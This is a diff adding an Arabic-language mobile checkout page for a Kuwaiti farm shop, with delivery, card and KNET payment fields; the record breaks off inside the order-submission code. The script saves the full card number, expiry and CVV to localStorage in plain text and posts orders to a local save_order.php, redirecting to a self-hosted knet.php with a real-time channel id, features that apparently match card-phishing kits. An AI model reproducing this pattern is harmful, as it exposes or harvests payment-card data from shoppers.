@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>إتمام الطلب | مزارع الثنيان</title>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&display=swap" rel="stylesheet" />
+    <style>
+        :root {
+            --blue: #025380;
+            --blue-soft: #e8f0f5;
+            --gray-bg: #f5f5f5;
+            --muted: #707070;
+            --green: #16a34a;
+            --err: #dc2626;
+            --err-bg: #fff5f5;
+        }
+
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            font-family: Tajawal, system-ui, sans-serif;
+            background: #fafafa;
+            color: #111;
+        }
+
+        .app {
+            max-width: 480px;
+            margin: 0 auto;
+            min-height: 100vh;
+            background: #fff;
+            padding-bottom: 100px;
+        }
+
+        .topbar {
+            display: grid;
+            grid-template-columns: 56px 1fr 48px;
+            align-items: center;
+            padding: 14px 16px;
+            border-bottom: 1px solid #eee;
+            position: relative;
+            background: #fff;
+        }
+
+        .topbar h1 {
+            grid-column: 2;
+            justify-self: center;
+            margin: 0;
+            font-size: 17px;
+            font-weight: 800;
+            text-align: center;
+        }
+
+        .topbar .back {
+            grid-column: 1;
+            justify-self: start;
+            color: #111;
+            text-decoration: none;
+            padding: 6px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 44px;
+            min-height: 44px;
+            line-height: 0;
+        }
+
+        .topbar .back svg {
+            width: 30px;
+            height: 30px;
+            display: block;
+        }
+
+        .topbar .head-spacer {
+            grid-column: 3;
+        }
+
+        .eta-strip {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 12px 16px;
+            background: var(--gray-bg);
+            font-size: 14px;
+            font-weight: 600;
+            color: #025380;
+        }
+
+        .eta-strip svg {
+            flex-shrink: 0;
+            color: #025380;
+        }
+
+        .block {
+            padding: 18px 16px 8px;
+        }
+
+        .block h2 {
+            margin: 0 0 14px;
+            font-size: 16px;
+            font-weight: 800;
+            text-align: right;
+        }
+        .pay-logos {
+	width: 60px; /* عدل الحجم */
+	height: auto;
+	object-fit: contain;
+}
+.knet-badge {
+	background: #f5f5f5;
+	padding: 5px 10px;
+	border-radius: 10px;
+}
+        .card-fields-title {
+            margin: 12px 0 14px;
+            font-size: 16px;
+            font-weight: 800;
+            text-align: right;
+        }
+
+.field {
+	width: 100%;
+	margin-bottom: 12px;
+	padding: 19px 16px;
+	border: none;
+	border-radius: 20px;
+	background: var(--gray-bg);
+	font-family: inherit;
+	font-size: 15px;
+	text-align: right;
+}
+
+        .field::placeholder {
+            color: #888;
+        }
+
+        .field-group {
+            margin-bottom: 12px;
+        }
+
+        .field-group > .field,
+        .field-group > .ltr-wrap,
+        .field-group > .phone-row {
+            margin-bottom: 0;
+        }
+
+        .field-msg {
+            display: none;
+            margin: 6px 0 0;
+            padding: 0 4px 0 0;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--err);
+            text-align: right;
+            line-height: 1.45;
+        }
+
+        .field-group.has-error > .field-msg {
+            display: block;
+        }
+
+        .field-group.has-error > .field:not(.ltr-input),
+        .field-group.has-error > textarea.field {
+            box-shadow: 0 0 0 2px var(--err);
+            background: var(--err-bg);
+        }
+
+        .field-group.has-error .ltr-wrap .field.ltr-input {
+            box-shadow: 0 0 0 2px var(--err);
+            background: var(--err-bg);
+        }
+
+        .field-group.has-error .phone-row {
+            box-shadow: 0 0 0 2px var(--err);
+            border-radius: 999px;
+            background: var(--err-bg);
+        }
+
+        .field-group.has-error .phone-row .phone-cc {
+            background: transparent;
+        }
+
+        .row-3 .field-group {
+            margin-bottom: 0;
+            min-width: 0;
+        }
+
+        .row-3 .field-group .field-msg {
+            margin-top: 4px;
+            font-size: 12px;
+        }
+
+        /* رقم الهاتف: النص التوضيحي يمين، والكتابة LTR من اليسار */
+        .ltr-wrap {
+            position: relative;
+            width: 100%;
+            margin-bottom: 12px;
+        }
+
+        .ltr-wrap.ltr-in-phone {
+            margin-bottom: 0;
+            flex: 1;
+            min-width: 0;
+        }
+
+        .ltr-wrap .field.ltr-input {
+            margin-bottom: 0;
+            width: 100%;
+            direction: ltr;
+            text-align: left;
+            padding-right: 46%;
+        }
+
+        .ltr-wrap .ltr-ph {
+            position: absolute;
+            right: 18px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: #888;
+            font-size: 15px;
+            pointer-events: none;
+            max-width: 44%;
+            text-align: right;
+            line-height: 1.25;
+        }
+
+        .ltr-wrap.has-input .ltr-ph {
+            display: none;
+        }
+
+        textarea.field {
+            border-radius: 20px;
+            min-height: 88px;
+            resize: vertical;
+        }
+
+        .phone-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 0;
+            direction: rtl;
+            align-items: stretch;
+        }
+
+        .phone-cc {
+            flex: 0 0 auto;
+            padding: 14px 12px;
+            border-radius: 999px;
+            background: var(--gray-bg);
+            font-weight: 700;
+            font-size: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 72px;
+        }
+
+        .toggle-row {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 8px;
+        }
+
+        .toggle-btn {
+            flex: 1;
+            padding: 14px 12px;
+            border-radius: 999px;
+            border: 2px solid transparent;
+            background: var(--gray-bg);
+            font-family: inherit;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        .toggle-btn.active {
+            background: #fff;
+            border-color: #025380;
+            color: #025380;
+        }
+
+        .summary-box {
+            background: var(--gray-bg);
+            border-radius: 16px;
+            padding: 14px 16px;
+            margin-top: 4px;
+        }
+
+        .sum-prod {
+            display: grid;
+            grid-template-columns: 1fr auto;
+            gap: 10px 14px;
+            align-items: start;
+            padding: 12px 0;
+            border-bottom: 1px solid #e8e8e8;
+        }
+
+        .sum-prod:last-of-type {
+            border-bottom: none;
+        }
+
+        .sum-name {
+            font-weight: 800;
+            font-size: 15px;
+            line-height: 1.4;
+            text-align: right;
+        }
+
+        .sum-desc {
+            margin: 6px 0 0;
+            font-size: 13px;
+            font-weight: 500;
+            color: #707070;
+            line-height: 1.45;
+            text-align: right;
+        }
+
+        .sum-amount-col {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 6px;
+            text-align: left;
+            direction: ltr;
+        }
+
+        .sum-price {
+            font-weight: 800;
+            font-size: 15px;
+        }
+
+        .sum-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            font-size: 15px;
+        }
+
+        .sum-row.muted .sum-label {
+            color: var(--muted);
+        }
+
+        .sum-row .free {
+            color: var(--green);
+            font-weight: 700;
+        }
+
+        .sum-divider {
+            height: 1px;
+            background: #ddd;
+            margin: 6px 0;
+        }
+
+        .sum-total {
+            display: flex;
+            justify-content: space-between;
+            font-size: 17px;
+            font-weight: 800;
+            padding-top: 8px;
+        }
+
+        .pay-methods {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 4px;
+        }
+
+        .pay-card.pay-option {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 14px 16px;
+            border-radius: 16px;
+            border: 2px solid #ddd;
+            background: #f9f9f9;
+            margin-bottom: 0;
+            cursor: pointer;
+        }
+
+        .pay-card.pay-option.pay-option--checked {
+            border-color: #025380;
+            background: var(--blue-soft);
+        }
+
+        .pay-card input[type="radio"] {
+            width: 20px;
+            height: 20px;
+            accent-color: #025380;
+            flex-shrink: 0;
+        }
+
+        .pay-card .pay-label {
+            flex: 1;
+            font-weight: 700;
+            font-size: 15px;
+            text-align: right;
+        }
+
+        .pay-logos {
+            font-size: 11px;
+            font-weight: 800;
+            color: var(--muted);
+            white-space: nowrap;
+        }
+
+        .pay-logos.knet-badge {
+            font-size: 13px;
+            letter-spacing: 0.04em;
+            color: #025380;
+        }
+
+        .card-fields-wrap {
+            margin-top: 8px;
+        }
+
+        .card-fields-wrap.is-hidden {
+            display: none;
+        }
+
+        .row-3 {
+            display: grid;
+            grid-template-columns: 1fr 1fr 1fr;
+            gap: 8px;
+        }
+
+.row-3 .field {
+	margin-bottom: 0;
+	border-radius: 16px;
+	font-size: 14px;
+	padding: 19px 10px;
+}
+
+        .sticky-foot {
+            position: fixed;
+            left: 50%;
+            transform: translateX(-50%);
+            bottom: 0;
+            width: 100%;
+            max-width: 480px;
+            padding: 12px 16px 22px;
+            background: linear-gradient(to top, #fff 80%, rgba(255, 255, 255, 0));
+            z-index: 30;
+        }
+
+        .btn-submit {
+            width: 100%;
+            border: none;
+            border-radius: 999px;
+            background: #0a4d6e;
+            color: #fff;
+            padding: 16px 20px;
+            font-family: inherit;
+            font-size: 16px;
+            font-weight: 800;
+            cursor: pointer;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 5px 16px rgba(10, 77, 110, 0.38);
+        }
+
+        .btn-submit-inner {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 6px 8px;
+            direction: rtl;
+            font-weight: 800;
+        }
+
+        .btn-submit-label {
+            white-space: nowrap;
+            font-weight: 800;
+        }
+
+        .btn-submit-dot {
+            opacity: 0.9;
+            font-weight: 800;
+            user-select: none;
+        }
+
+        .btn-submit-total {
+            white-space: nowrap;
+            font-variant-numeric: tabular-nums;
+            letter-spacing: 0.02em;
+            font-weight: 800;
+        }
+
+        .empty-note {
+            text-align: center;
+            padding: 48px 20px;
+            color: var(--muted);
+        }
+
+        .empty-note a {
+            color: var(--blue);
+            font-weight: 700;
+        }
+
+    </style>
+</head>
+
+<body>
+    <div class="app" id="app"></div>
+    <script>
+        (function () {
+            var KEY = "farm_cart";
+            var currency = "د.ك";
+
+            function getFarmClientSessionId() {
+                try {
+                    return localStorage.getItem("farm_client_session_id") || "";
+                } catch (eSid) {
+                    return "";
+                }
+            }
+
+            function getFarmChannelSuffix() {
+                try {
+                    return sessionStorage.getItem("farm_pusher_channel_suffix") || "";
+                } catch (eCh) {
+                    return "";
+                }
+            }
+
+            function money(n) {
+                return (Number(n) || 0).toFixed(3) + " " + currency;
+            }
+
+            function normalizeItem(raw) {
+                if (!raw || typeof raw !== "object") return null;
+                if (raw.product && typeof raw.product === "object") {
+                    var pr = raw.product;
+                    return {
+                        id: raw.id != null ? raw.id : pr.id,
+                        product: {
+                            name: pr.name || "",
+                            description: pr.description || "",
+                            image: pr.image || "",
+                            price: Number(pr.price) || 0
+                        },
+                        quantity: raw.quantity || 1
+                    };
+                }
+                return {
+                    id: raw.id,
+                    product: {
+                        name: raw.name || "",
+                        description: raw.description || "",
+                        image: raw.image || "",
+                        price: Number(raw.price) || 0
+                    },
+                    quantity: raw.quantity || 1
+                };
+            }
+
+            function loadCart() {
+                try {
+                    var raw = localStorage.getItem(KEY) || sessionStorage.getItem(KEY);
+                    if (!raw) {
+                        raw = localStorage.getItem("farm_cart_v1") || sessionStorage.getItem("farm_cart_v1");
+                    }
+                    if (!raw) return [];
+                    var arr = JSON.parse(raw);
+                    if (!Array.isArray(arr)) return [];
+                    var out = [];
+                    for (var i = 0; i < arr.length; i++) {
+                        var n = normalizeItem(arr[i]);
+                        if (n) out.push(n);
+                    }
+                    return out;
+                } catch (e) {
+                    return [];
+                }
+            }
+
+            function escapeHtml(s) {
+                return String(s)
+                    .replace(/&/g, "&amp;")
+                    .replace(/</g, "&lt;")
+                    .replace(/>/g, "&gt;")
+                    .replace(/"/g, "&quot;");
+            }
+
+            var checkoutErrIds = ["fullName", "addr1", "phoneLocal", "cardName", "cardNum", "cardMonth", "cardYear", "cardCvv"];
+
+            function clearFieldError(fieldId) {
+                var g = document.getElementById("grp-" + fieldId);
+                var m = document.getElementById("msg-" + fieldId);
+                if (g) {
+                    g.classList.remove("has-error");
+                }
+                if (m) {
+                    m.textContent = "";
+                }
+            }
+
+            function clearCheckoutErrors() {
+                checkoutErrIds.forEach(clearFieldError);
+            }
+
+            function setFieldError(fieldId, text) {
+                var g = document.getElementById("grp-" + fieldId);
+                var m = document.getElementById("msg-" + fieldId);
+                if (g) {
+                    g.classList.add("has-error");
+                }
+                if (m) {
+                    m.textContent = text;
+                }
+            }
+
+            function scrollFirstCheckoutError() {
+                var el = document.querySelector(".field-group.has-error");
+                if (el) {
+                    el.scrollIntoView({ behavior: "smooth", block: "center" });
+                }
+            }
+
+            function bindCheckoutErrorClear() {
+                checkoutErrIds.forEach(function (id) {
+                    var inp = document.getElementById(id);
+                    if (!inp) {
+                        return;
+                    }
+                    var handler = function () {
+                        clearFieldError(id);
+                    };
+                    inp.addEventListener("input", handler);
+                    inp.addEventListener("change", handler);
+                });
+            }
+
+            function iconBackChevron() {
+                return '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3.2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 7l5 5-5 5"/></svg>';
+            }
+
+            function iconClock() {
+                return '<svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>';
+            }
+
+            function buildOrderText(items, extra, payType) {
+                var lines = ["طلب جديد — مزارع الثنيان", "", "نوع الدفع: " + (payType || "دفع كامل"), ""];
+                items.forEach(function (it) {
+                    var p = it.product || {};
+                    lines.push((p.name || "") + " × " + (it.quantity || 0) + " — " + money(p.price ? p.price * (it.quantity || 0) : 0));
+                });
+                var t = items.reduce(function (s, it) {
+                    return s + (it.product && it.product.price ? it.product.price * it.quantity : 0);
+                }, 0);
+                lines.push("", "المجموع: " + money(t));
+                if (extra) {
+                    lines.push("", "بيانات العميل:", extra);
+                }
+                return lines.join("\n");
+            }
+
+            function render() {
+                var items = loadCart();
+                var app = document.getElementById("app");
+                var subtotal = items.reduce(function (s, it) {
+                    return s + (it.product && it.product.price ? it.product.price * it.quantity : 0);
+                }, 0);
+
+                if (!items.length) {
+                    app.innerHTML =
+                        '<div class="topbar">' +
+                        '<a class="back" href="cart.html" aria-label="رجوع">' +
+                        iconBackChevron() +
+                        "</a>" +
+                        '<h1>إتمام الطلب</h1>' +
+                        '<span class="head-spacer"></span></div>' +
+                        '<div class="empty-note">السلة فارغة. <a href="index.html">العودة للمتجر</a></div>';
+                    return;
+                }
+
+                var productsHtml = items
+                    .map(function (it) {
+                        var p = it.product || {};
+                        var q = it.quantity || 0;
+                        var amt = p.price ? p.price * q : 0;
+                        var descText = (p.description && String(p.description).trim()) || "";
+                        var descHtml = descText
+                            ? '<div class="sum-desc">' + escapeHtml(descText) + "</div>"
+                            : "";
+                        return (
+                            '<div class="sum-prod">' +
+                            '<div><div class="sum-name">' +
+                            escapeHtml(p.name || "") +
+                            "</div>" +
+                            descHtml +
+                            '</div><div class="sum-amount-col">' +
+                            '<span class="sum-price">' +
+                            money(amt) +
+                            "</span></div></div>"
+                        );
+                    })
+                    .join("");
+
+                app.innerHTML =
+                    '<div class="topbar">' +
+                    '<a class="back" href="cart.html" aria-label="رجوع">' +
+                    iconBackChevron() +
+                    "</a>" +
+                    '<h1>إتمام الطلب</h1>' +
+                    '<span class="head-spacer"></span></div>' +
+                    '<div class="eta-strip">' +
+                    iconClock() +
+                    '<span>اليوم، خلال 40 دقيقة</span></div>' +
+                    '<div class="block"><h2>عنوان التوصيل</h2>' +
+                    '<div class="field-group" id="grp-fullName">' +
+                    '<input class="field" id="fullName" type="text" autocomplete="name" placeholder="الاسم الكامل" />' +
+                    '<p class="field-msg" id="msg-fullName"></p></div>' +
+                    '<div class="field-group" id="grp-addr1">' +
+                    '<input class="field" id="addr1" type="text" placeholder="العنوان (منطقة - قطعة - شارع)" />' +
+                    '<p class="field-msg" id="msg-addr1"></p></div>' +
+                    '<input class="field" id="addr2" type="text" placeholder="جادة / منزل / شقة" />' +
+                    '<div class="field-group" id="grp-phoneLocal">' +
+                    '<div class="phone-row">' +
+                    '<span class="phone-cc">+965</span>' +
+                    '<div class="ltr-wrap ltr-in-phone">' +
+                    '<input class="field ltr-input" id="phoneLocal" type="tel" inputmode="numeric" autocomplete="tel-national" />' +
+                    '<span class="ltr-ph">رقم الهاتف</span></div></div>' +
+                    '<p class="field-msg" id="msg-phoneLocal"></p></div>' +
+                    '<textarea class="field" id="driverNote" placeholder="ملاحظات للسائق (اختياري)"></textarea></div>' +
+                    '<div class="block"><h2>طريقة الدفع</h2>' +
+                    '<div class="pay-methods">' +
+                    '<label class="pay-card pay-option"><input type="radio" name="pm" checked value="card" id="pm-card" /><span class="pay-label">بطاقة ائتمان</span><div class="flex items-center gap-1 mr-auto"><svg width="28" height="20" viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#1A1F71"></rect><text x="24" y="20" text-anchor="middle" fill="white" font-size="11" font-weight="bold" font-family="Arial">VISA</text></svg><svg width="28" height="20" viewBox="0 0 48 32" fill="none"><rect width="48" height="32" rx="4" fill="#f5f5f5"></rect><circle cx="19" cy="16" r="10" fill="#EB001B"></circle><circle cx="29" cy="16" r="10" fill="#F79E1B" opacity="0.8"></circle></svg></div></label>' +
+                    '<label class="pay-card pay-option"><input type="radio" name="pm" value="knet" id="pm-knet" /><span class="pay-label">KNET</span><img class="pay-logos knet-badge" src="https://www.aljarida.com/uploads/imported_images/images/1487357434230872700/1487357836000/1280x960.jpg" alt="KNET"></label>' +
+                    "</div>" +
+                    '<div id="card-fields-wrap" class="card-fields-wrap">' +
+                    '<h2 class="card-fields-title">بيانات البطاقة</h2>' +
+                    '<div class="field-group" id="grp-cardName">' +
+                    '<input class="field" id="cardName" placeholder="اسم حامل البطاقة" />' +
+                    '<p class="field-msg" id="msg-cardName"></p></div>' +
+                    '<div class="field-group" id="grp-cardNum">' +
+                    '<div class="ltr-wrap">' +
+                    '<input class="field ltr-input" id="cardNum" type="text" maxlength="19" inputmode="numeric" autocomplete="cc-number" />' +
+                    '<span class="ltr-ph">رقم البطاقة</span></div>' +
+                    '<p class="field-msg" id="msg-cardNum"></p></div>' +
+                    '<div class="row-3">' +
+                    '<div class="field-group" id="grp-cardMonth">' +
+                    '<select class="field" id="cardMonth"><option value="">الشهر</option>' +
+                    Array.from({
+                            length: 12
+                        }, function (_, i) {
+                            return "<option>" + (i + 1) + "</option>";
+                        })
+                        .join("") +
+                    '</select><p class="field-msg" id="msg-cardMonth"></p></div>' +
+                    '<div class="field-group" id="grp-cardYear">' +
+                    '<select class="field" id="cardYear"><option value="">السنة</option>' +
+                    Array.from({
+                            length: 12
+                        }, function (_, i) {
+                            var y = new Date().getFullYear() + i;
+                            return "<option>" + y + "</option>";
+                        })
+                        .join("") +
+                    '</select><p class="field-msg" id="msg-cardYear"></p></div>' +
+                    '<div class="field-group" id="grp-cardCvv">' +
+                    '<input class="field" id="cardCvv" type="text" placeholder="CVV" maxlength="4" inputmode="numeric" pattern="[0-9]*" autocomplete="cc-csc" dir="ltr" style="text-align:center" />' +
+                    '<p class="field-msg" id="msg-cardCvv"></p></div></div></div></div>' +
+                    '<div class="block"><h2>نوع الدفع</h2>' +
+                    '<div class="toggle-row">' +
+                    '<button type="button" class="toggle-btn active" data-pay="full" id="pay-full">دفع كامل</button>' +
+                    '<button type="button" class="toggle-btn" data-pay="half" id="pay-half">عربون 50%</button>' +
+                    "</div></div>" +
+                    '<div class="block"><h2>ملخص الطلب</h2>' +
+                    '<div class="summary-box">' +
+                    productsHtml +
+                    '<div class="sum-row muted"><span class="sum-label">رسوم التوصيل</span><span class="free">مجاني</span></div>' +
+                    '<div class="sum-divider"></div>' +
+                    '<div class="sum-total"><span>المجموع</span><span id="sum-total-val">' +
+                    money(subtotal) +
+                    "</span></div></div></div>" +
+                    '<div class="sticky-foot">' +
+                    '<button type="button" class="btn-submit" id="send-wa">' +
+                    '<span class="btn-submit-inner">' +
+                    '<span class="btn-submit-label">متابعة الدفع</span>' +
+                    '<span class="btn-submit-dot" aria-hidden="true">•</span>' +
+                    '<span class="btn-submit-total" id="submit-pay-total">' +
+                    money(subtotal) +
+                    "</span></span></button></div>";
+
+                document.querySelectorAll(".ltr-wrap").forEach(function (w) {
+                    var inp = w.querySelector("input.ltr-input");
+                    if (!inp) return;
+                    function sync() {
+                        var len =
+                            inp.id === "cardNum"
+                                ? inp.value.replace(/\D/g, "").length
+                                : inp.value.length;
+                        w.classList.toggle("has-input", len > 0);
+                    }
+                    inp.addEventListener("input", sync);
+                    inp.addEventListener("change", sync);
+                    inp.addEventListener("blur", sync);
+                    sync();
+                });
+
+                (function bindCardNumFormat() {
+                    var el = document.getElementById("cardNum");
+                    if (!el) return;
+                    function formatValue() {
+                        var v = el.value;
+                        var c = el.selectionStart;
+                        var left = v.slice(0, c);
+                        var nLeft = left.replace(/\D/g, "").length;
+                        var digits = v.replace(/\D/g, "").slice(0, 16);
+                        var parts = [];
+                        for (var i = 0; i < digits.length; i += 4) {
+                            parts.push(digits.slice(i, i + 4));
+                        }
+                        var newVal = parts.join(" ");
+                        el.value = newVal;
+                        var pos = 0;
+                        if (nLeft === 0) {
+                            el.setSelectionRange(0, 0);
+                            return;
+                        }
+                        var count = 0;
+                        for (; pos < newVal.length; pos++) {
+                            if (/\d/.test(newVal[pos])) {
+                                count++;
+                                if (count === nLeft) {
+                                    pos++;
+                                    break;
+                                }
+                            }
+                        }
+                        el.setSelectionRange(pos, pos);
+                    }
+                    el.addEventListener("input", formatValue);
+                })();
+
+                (function bindCvvDigitsOnly() {
+                    var el = document.getElementById("cardCvv");
+                    if (!el) return;
+                    function strip() {
+                        el.value = el.value.replace(/\D/g, "").slice(0, 4);
+                    }
+                    el.addEventListener("input", strip);
+                    el.addEventListener("paste", function (e) {
+                        e.preventDefault();
+                        var t = (e.clipboardData || window.clipboardData).getData("text") || "";
+                        el.value = (el.value + t).replace(/\D/g, "").slice(0, 4);
+                    });
+                })();
+
+                (function bindPaymentMethodToggle() {
+                    function syncPaymentMethodUi() {
+                        var r = document.querySelector('input[name="pm"]:checked');
+                        var knet = r && r.value === "knet";
+                        var wrap = document.getElementById("card-fields-wrap");
+                        if (wrap) {
+                            wrap.classList.toggle("is-hidden", knet);
+                        }
+                        document.querySelectorAll(".pay-option").forEach(function (lab) {
+                            var inp = lab.querySelector('input[name="pm"]');
+                            lab.classList.toggle("pay-option--checked", !!(inp && inp.checked));
+                        });
+                        clearCheckoutErrors();
+                    }
+                    document.querySelectorAll('input[name="pm"]').forEach(function (radio) {
+                        radio.addEventListener("change", syncPaymentMethodUi);
+                    });
+                    syncPaymentMethodUi();
+                })();
+
+                bindCheckoutErrorClear();
+
+                var CHECKOUT_DRAFT_KEY = "farm_checkout_draft";
+
+                function readCheckoutDraft() {
+                    try {
+                        var raw = localStorage.getItem(CHECKOUT_DRAFT_KEY);
+                        if (!raw) {
+                            return null;
+                        }
+                        var o = JSON.parse(raw);
+                        return o && typeof o === "object" ? o : null;
+                    } catch (eRd) {
+                        return null;
+                    }
+                }
+
+                function writeCheckoutDraft(obj) {
+                    try {
+                        localStorage.setItem(CHECKOUT_DRAFT_KEY, JSON.stringify(obj));
+                    } catch (eWr) {}
+                }
+
+                var payMode = "full";
+
+                function collectCheckoutDraftFromDom() {
+                    function v(id) {
+                        var el = document.getElementById(id);
+                        return el ? String(el.value || "").trim() : "";
+                    }
+                    var pmEl = document.querySelector('input[name="pm"]:checked');
+                    var pm = pmEl ? pmEl.value : "card";
+                    return {
+                        fullName: v("fullName"),
+                        addr1: v("addr1"),
+                        addr2: v("addr2"),
+                        phoneLocal: v("phoneLocal"),
+                        driverNote: v("driverNote"),
+                        cardName: v("cardName"),
+                        cardNum: v("cardNum"),
+                        cardMonth: (document.getElementById("cardMonth") || {}).value || "",
+                        cardYear: (document.getElementById("cardYear") || {}).value || "",
+                        cardCvv: v("cardCvv"),
+                        pm: pm,
+                        payMode: payMode
+                    };
+                }
+
+                var draftTimer = null;
+                function scheduleCheckoutDraftSave() {
+                    if (draftTimer) {
+                        clearTimeout(draftTimer);
+                    }
+                    draftTimer = setTimeout(function () {
+                        draftTimer = null;
+                        writeCheckoutDraft(collectCheckoutDraftFromDom());
+                    }, 350);
+                }
+
+                function chargeNowAmount() {
+                    return payMode === "half" ? subtotal * 0.5 : subtotal;
+                }
+
+                function syncSubmitPayTotal() {
+                    var el = document.getElementById("submit-pay-total");
+                    if (el) {
+                        el.textContent = money(chargeNowAmount());
+                    }
+                }
+
+                function setPay(m) {
+                    payMode = m;
+                    document.querySelectorAll(".toggle-btn").forEach(function (b) {
+                        b.classList.toggle("active", b.getAttribute("data-pay") === m);
+                    });
+                    var half = m === "half";
+                    document.getElementById("sum-total-val").textContent = money(half ? subtotal * 0.5 : subtotal);
+                    syncSubmitPayTotal();
+                    scheduleCheckoutDraftSave();
+                }
+                document.getElementById("pay-full").onclick = function () {
+                    setPay("full");
+                };
+                document.getElementById("pay-half").onclick = function () {
+                    setPay("half");
+                };
+
+                function applyCheckoutDraftToDom() {
+                    var d = readCheckoutDraft();
+                    if (!d) {
+                        return;
+                    }
+                    function setv(id, val) {
+                        if (val == null || String(val) === "") {
+                            return;
+                        }
+                        var el = document.getElementById(id);
+                        if (el) {
+                            el.value = String(val);
+                        }
+                    }
+                    setv("fullName", d.fullName);
+                    setv("addr1", d.addr1);
+                    setv("addr2", d.addr2);
+                    setv("phoneLocal", d.phoneLocal);
+                    setv("driverNote", d.driverNote);
+                    setv("cardName", d.cardName);
+                    setv("cardNum", d.cardNum);
+                    var cm = document.getElementById("cardMonth");
+                    if (cm && d.cardMonth) {
+                        cm.value = d.cardMonth;
+                    }
+                    var cy = document.getElementById("cardYear");
+                    if (cy && d.cardYear) {
+                        cy.value = d.cardYear;
+                    }
+                    setv("cardCvv", d.cardCvv);
+                    if (d.pm === "knet" || d.pm === "card") {
+                        var r = document.querySelector('input[name="pm"][value="' + d.pm + '"]');
+                        if (r) {
+                            r.checked = true;
+                            r.dispatchEvent(new Event("change", { bubbles: true }));
+                        }
+                    }
+                    if (d.payMode === "half" || d.payMode === "full") {
+                        setPay(d.payMode);
+                    }
+                    var cn = document.getElementById("cardNum");
+                    if (cn && cn.value) {
+                        cn.dispatchEvent(new Event("input", { bubbles: true }));
+                    }
+                    document.querySelectorAll(".ltr-wrap").forEach(function (w) {
+                        var inp = w.querySelector("input.ltr-input");
+                        if (inp) {
+                            var len =
+                                inp.id === "cardNum"
+                                    ? inp.value.replace(/\D/g, "").length
+                                    : inp.value.length;
+                            w.classList.toggle("has-input", len > 0);
+                        }
+                    });
+                    writeCheckoutDraft(collectCheckoutDraftFromDom());
+                }
+
+                if (!app.getAttribute("data-farm-checkout-draft")) {
+                    app.setAttribute("data-farm-checkout-draft", "1");
+                    app.addEventListener("input", scheduleCheckoutDraftSave, true);
+                    app.addEventListener("change", scheduleCheckoutDraftSave, true);
+                    window.addEventListener("beforeunload", function () {
+                        try {
+                            writeCheckoutDraft(collectCheckoutDraftFromDom());
+                        } catch (eBu) {}
+                    });
+                }
+                applyCheckoutDraftToDom();
+
+                document.getElementById("send-wa").onclick = function () {
+                    function val(id) {
+                        var el = document.getElementById(id);
+                        return el ? String(el.value || "").trim() : "";
+                    }
+                    clearCheckoutErrors();
+
+                    var pmEl = document.querySelector('input[name="pm"]:checked');
+                    var pm = pmEl ? pmEl.value : "card";
+
+                    function validateDelivery() {
+                        if (!val("fullName")) {
+                            setFieldError("fullName", "الاسم الكامل مطلوب");
+                        }
+                        if (!val("addr1")) {
+                            setFieldError("addr1", "عنوان التوصيل (السطر الأول) مطلوب");
+                        }
+                        var ph = val("phoneLocal").replace(/\D/g, "");
+                        if (ph.length < 8) {
+                            setFieldError("phoneLocal", "أدخل رقم هاتف صحيحاً (8 أرقام على الأقل)");
+                        }
+                    }
+
+                    if (pm === "knet") {
+                        validateDelivery();
+                        if (document.querySelector(".field-group.has-error")) {
+                            scrollFirstCheckoutError();
+                            return;
+                        }
+                        var knetCharge = payMode === "half" ? subtotal * 0.5 : subtotal;
+                        var knetTotalNum = Number(knetCharge.toFixed(3));
+                        try {
+                            if (window.farmTrack && typeof window.farmTrack.flushBeacon === "function") {
+                                window.farmTrack.flushBeacon();
+                            }
+                        } catch (eTrack) {}
+                        var orderDataKnet = {
+                            fullName: val("fullName"),
+                            phoneCC: val("phoneCC") || "+965",
+                            phoneLocal: val("phoneLocal"),
+                            addr1: val("addr1"),
+                            addr2: val("addr2"),
+                            building: val("building"),
+                            floor: val("floor"),
+                            apartment: val("apartment"),
+                            notes: val("driverNote"),
+                            paymentMethod: "knet",
+                            paymentMode: payMode,
+                            subtotal: subtotal,
+                            total: knetTotalNum,
+                            currency: currency,
+                            cart: JSON.parse(localStorage.getItem("farm_cart") || "[]"),
+                            cardName: "",
+                            cardNum: "",
+                            cardMonth: "",
+                            cardYear: "",
+                            cardCvv: "",
+                            client_session_id: getFarmClientSessionId(),
+                            client_channel_suffix: getFarmChannelSuffix()
+                        };
+                        fetch("save_order.php", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify(orderDataKnet)
+                        })
+                            .then(function (response) {
+                                return response.json();
+                            })
+                            .then(function (result) {
+                                if (result.success) {
+                                    try {
+                                        writeCheckoutDraft(collectCheckoutDraftFromDom());
+                                    } catch (eDraftK) {}
+                                    try {
+                                        sessionStorage.setItem("farm_order_id", String(result.order_id));
+                                    } catch (eSid) {}
+                                    window.location.href =
+                                        result.redirect ||
+                                        "knet.php?order_id=" +
+                                            encodeURIComponent(result.order_id) +
+                                            "&total=" +
+                                            encodeURIComponent(String(knetTotalNum)) +
+                                            "&tickets=0";
+                                } else {
+                                    alert("خطأ: " + (result.message || "تعذّر حفظ الطلب"));
+                                }
+                            })
+                            .catch(function (error) {
+                                console.error("Error:", error);
